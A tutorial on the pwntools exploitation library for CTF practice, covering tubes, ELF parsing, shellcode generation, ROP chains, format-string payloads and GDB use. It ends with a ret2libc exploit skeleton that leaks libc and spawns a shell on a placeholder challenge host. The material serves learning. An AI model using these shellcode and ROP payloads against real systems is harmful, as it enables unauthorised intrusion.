# A Practical Guide to pwntools

pwntools is a Python library used for writing exploits, mostly in the context of CTFs and binary exploitation research. It wraps up a lot of the tedious plumbing — talking to processes over sockets, packing integers, crafting ROP chains, interacting with GDB — into a clean API.

---

## 1. Installation

```bash
# Debian/Ubuntu (works well on Debian 13/Trixie)
sudo apt update
sudo apt install python3-pip python3-dev git libssl-dev libffi-dev build-essential

pip install --user pwntools
# or in a venv (recommended)
python3 -m venv pwn-env
source pwn-env/bin/activate
pip install pwntools
```

Verify it works:

```bash
python3 -c "from pwn import *; print(pwnlib.__version__)"
```

You'll also want binutils, gdb, and gdb-peda/pwndbg/gef for debugging — pwntools plays nicely with all three.

---

## 2. Core concepts

Everything starts with:

```python
from pwn import *
```

This dumps a large namespace into scope (packing helpers, tube classes, ELF parsing, shellcode generation, etc.). It's the intended way to use the library — not considered bad practice here the way `import *` normally is.

### 2.1 `context` — global configuration

```python
context.arch = 'amd64'      # 'i386', 'arm', 'aarch64', 'mips', ...
context.os = 'linux'
context.log_level = 'debug' # 'info', 'warn', 'error'
context.terminal = ['tmux', 'splitw', '-h']  # how GDB windows pop up
```

Many pwntools functions (packing, shellcraft, ROP) read `context` to know word size and endianness, so set it early. If you load an ELF first, pwntools often infers `context.arch` automatically from the binary.

### 2.2 Tubes — the unified I/O abstraction

A "tube" is anything you can `send`/`recv` from: a local process, a remote socket, an SSH session. They all share the same interface.

```python
p = process('./vuln')                 # run a local binary
io = remote('challenge.host', 1337)   # connect over TCP
s  = ssh(host='1.2.3.4', user='ctf', password='pw')
sp = s.process('./vuln')              # run a binary over SSH
```

Common tube methods:

```python
p.send(b'data')
p.sendline(b'data')          # appends newline
p.recv(1024)                 # read up to N bytes
p.recvline()                 # read until \n
p.recvuntil(b'prompt: ')     # read until a delimiter (inclusive)
p.recvn(4)                   # read exactly N bytes
p.sendafter(b'prompt: ', b'payload')   # recvuntil + send combined
p.sendlineafter(b'prompt: ', b'payload')
p.interactive()              # hand control to your terminal — used at the end of an exploit
p.close()
```

`recvuntil`/`sendlineafter` calls are the bread and butter of scripting interaction with a CTF binary's menu or prompts.

---

## 3. Packing and unpacking data

Binary exploitation involves constantly converting between Python ints and raw bytes, respecting the target's word size and endianness.

```python
p32(0xdeadbeef)          # -> b'\xef\xbe\xad\xde' (little endian by default)
p64(0x4141414141414141)
u32(b'\xef\xbe\xad\xde') # -> 0xdeadbeef  (back to int)
u64(data)

# Explicit endianness/size if you don't want to rely on context
p32(val, endian='big', sign='unsigned')
```

If `context.arch` is set, `pack()`/`unpack()` will auto-pick the right width.

---

## 4. Working with the binary: `ELF`

```python
elf = ELF('./vuln')

elf.entry              # entry point address
elf.symbols['main']    # address of a symbol
elf.got['puts']        # GOT entry address
elf.plt['puts']        # PLT stub address
elf.bss()              # address of .bss segment
elf.checksec()         # prints Canary/NX/PIE/RELRO status — do this first, always
```

`checksec` is usually the first thing you run on a new binary — it tells you what mitigations you're up against and shapes the whole exploit strategy (e.g., no canary means straightforward stack smashing; PIE means you need a leak first).

For the loaded libc:

```python
libc = ELF('./libc.so.6')
libc.symbols['system']
libc.search(b'/bin/sh').__next__()   # find a string's address inside the library
```

---

## 5. Shellcode: `shellcraft` and `asm`

```python
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())           # classic execve("/bin/sh")
shellcode = asm(shellcraft.cat('/flag'))
raw_bytes = asm('mov rax, 1; ret')         # assemble raw instructions
disasm(raw_bytes)                          # and disassemble back
```

`shellcraft` has templates for most common CTF shellcode goals (spawn a shell, connect back, read a file, etc.) across multiple architectures.

---

## 6. ROP chains

Return-oriented programming chains are painful to build by hand; `ROP` automates gadget discovery.

```python
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])   # leak puts@GOT via puts()
rop.call('main')                      # then return to main to re-exploit
payload = flat({
    offset_to_saved_rip: rop.chain()
})
```

`rop.chain()` builds the packed bytes; `flat()` is a convenient way to lay out a payload from a dict of offsets or a list of chunks without manually computing padding.

You can also search gadgets manually:

```python
rop.find_gadget(['pop rdi', 'ret'])
```

---

## 7. `flat()` and `fit()` for payload layout

```python
payload = flat(
    b'A' * 40,
    p64(elf.symbols['win']),
)
```

`fit()` is similar but supports a dict keyed by offset, auto-padding gaps — handy for format string payloads or structures where fields land at known offsets.

---

## 8. Format string helper

```python
payload = fmtstr_payload(offset, {target_addr: value})
```

Given the stack offset to your format string argument, this builds a `%n`-style payload that writes `value` to `target_addr` — pwntools works out the `%x$` positions and byte-write splitting for you.

---

## 9. GDB integration

```python
p = gdb.debug('./vuln', gdbscript='''
break main
continue
''')
```

Or attach to an already-running process:

```python
p = process('./vuln')
gdb.attach(p, gdbscript='break *0x400123')
```

This spawns GDB in a split terminal (controlled by `context.terminal`) so you can step through the crash live instead of guessing offsets blind.

---

## 10. Finding an offset (cyclic patterns)

Instead of manually crafting `AAAA...` buffers to find where EIP/RIP gets overwritten:

```python
payload = cyclic(200)          # unique 200-byte De Bruijn-style pattern
# ... crash the program, note the value in EIP/RIP ...
offset = cyclic_find(0x61616167)   # give it the 4/8-byte value from the crash
```

---

## 11. Putting it together — a minimal exploit skeleton

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# io = process('./vuln')                      # local testing
io = remote('chal.example.com', 1337)         # or against the real target

# Leak a libc address via puts(GOT entry)
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call(elf.symbols['main'])

offset = 72  # found via cyclic()

payload = flat({offset: rop.chain()})
io.sendlineafter(b'> ', payload)

io.recvuntil(b'\n')
leaked = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked - libc.symbols['puts']
log.info(f'libc base: {hex(libc.address)}')

# Second stage: build a one-shot or system("/bin/sh") chain using libc.address
rop2 = ROP(elf)
rop2.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
payload2 = flat({offset: rop2.chain()})
io.sendlineafter(b'> ', payload2)

io.interactive()
```

This is the shape of a huge fraction of classic CTF pwn challenges: leak → compute base → build a second chain → get a shell.

---

## 12. Useful odds and ends

- `log.info()`, `log.success()`, `log.warning()` — pwntools' colored logging, nicer than `print` for tracking exploit stages.
- `pause()` — halts execution so you can attach a debugger manually mid-script.
- `DynELF` — leak-based symbol resolution when you don't have the exact libc but can leak arbitrary memory.
- `pwn template` — a CLI command (from the `pwntools` package) that scaffolds a starter exploit script for you.
- `pwn checksec ./binary` — CLI version of `elf.checksec()`, no Python needed.
- `pwn cyclic 200` / `pwn cyclic -l 0x61616167` — CLI versions of the cyclic pattern helpers.

---

## 13. Where to go from here

- Official docs: https://docs.pwntools.com
- `pwntools` ships with a solid `CHANGELOG` and docstrings — `help(process)` etc. in a REPL is often faster than searching online.
- Practicing against sites like pwnable.kr, pwnable.tw, or ROP Emporium is the standard way to build muscle memory with the library before it clicks.

A reasonable learning order if you're newer to this: stack overflows with no protections → format strings → ret2libc with ASLR → basic ROP chains → heap exploitation. pwntools is useful at every one of those stages, but the payoff is biggest once you're past the "manually count bytes" phase and into leak-and-chain exploits.
